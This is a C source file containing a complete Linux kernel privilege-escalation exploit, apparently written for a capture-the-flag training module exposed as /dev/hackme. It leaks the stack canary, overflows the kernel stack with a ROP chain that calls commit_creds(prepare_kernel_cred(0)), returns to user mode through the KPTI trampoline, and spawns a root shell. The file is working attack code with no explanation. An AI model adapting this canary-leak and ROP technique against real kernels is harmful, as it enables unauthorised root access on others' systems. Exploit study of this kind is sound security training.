#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

ulong leak_cookie(int fd)
{
    ulong buf[20] = {0x0};
    ulong cookie;

    printf("reading\n");
    read(fd, buf, sizeof(buf));

    cookie = buf[16];
    printf("[+] cookie leaked: 0x%llx\n", cookie);
    return cookie;
}

unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
  	"movq %%rsp, %3\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags), "=r" (user_rsp) : : "memory" );
}

void pop_shell(void)
{
    system("/bin/sh");
}

// commit_creds(prepare_kernel_cred(0))

// ffffffff814c6410 T commit_creds
// ffffffff814c67f0 T prepare_kernel_cred
// ffffffff81000000 T _text

int main()
{
    int fd;
    ulong cookie;
    fd = open("/dev/hackme", O_RDWR);

    cookie = leak_cookie(fd);

    printf("writing\n");
    int off = 16;

    ulong payload[50] = {0};

    payload[off++] = cookie;
    payload[off++] = 0x1; // rbx
    payload[off++] = 0x2; // r12
    payload[off++] = 0x2; // rbp

    /* ROP */

    ulong base = 0xffffffff81000000; // hack
    ulong commit_creds = base + 0x4c6410;
    ulong prepare_kernel_cred = base + 0x4c67f0;
    ulong pop_rdi = base + 0x006370; // 0xffffffff81006370 : pop rdi ; ret;

    // 0xffffffff818c6eba : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6ead ; pop rbp ; ret
    ulong mov_rdi_rax = base + 0x8c6eba;

    // 0xffffffff8150b97e : pop rsi ; ret
    ulong pop_rsi = base + 0x50b97e;

    // 0xffffffff8100a55f : swapgs ; pop rbp ; ret
    ulong swapgs = base + 0x00a55f;

//     ffffffff814381cb:	48 cf                	iretq  
    ulong iretq = base + 0x4381cb;

    // ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
    ulong kpti_trampoline = base + 0x200f10 + 0x16;

    save_state();

    payload[off++] = pop_rdi;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;

    payload[off++] = pop_rsi;
    payload[off++] = 0;

    payload[off++] = mov_rdi_rax;
    payload[off++] = 0; // rbp
    payload[off++] = commit_creds;

    payload[off++] = kpti_trampoline;
    payload[off++] = 0; // rax
    payload[off++] = 0; // rdi

    // payload[off++] = swapgs;
    // payload[off++] = 0; // rbp
    // payload[off++] = iretq;

    payload[off++] = (ulong) pop_shell;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_rsp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));

}